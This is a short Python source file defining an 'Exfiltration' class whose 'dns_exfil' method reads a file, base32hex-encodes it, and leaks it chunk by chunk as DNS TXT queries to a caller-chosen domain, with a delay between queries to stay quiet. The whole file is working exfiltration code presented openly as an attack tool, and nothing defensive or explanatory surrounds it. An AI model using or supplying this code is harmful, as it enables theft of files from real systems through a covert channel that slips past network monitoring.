import base64, time, dns.resolver
class Exfiltration:
    @staticmethod
    def dns_exfil(file_path, domain, chunk_size=40, delay=0.2):
        with open(file_path, 'rb') as f: data = base64.b32hexencode(f.read()).decode()
        chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
        results = []
        for i, chunk in enumerate(chunks):
            try:
                answers = dns.resolver.resolve(f"{i}.{chunk}.{domain}", "TXT")
                results.append(f"Sent chunk {i}/{len(chunks)}")
            except Exception as e: results.append(f"Failed chunk {i}: {e}")
            time.sleep(delay)
        return results
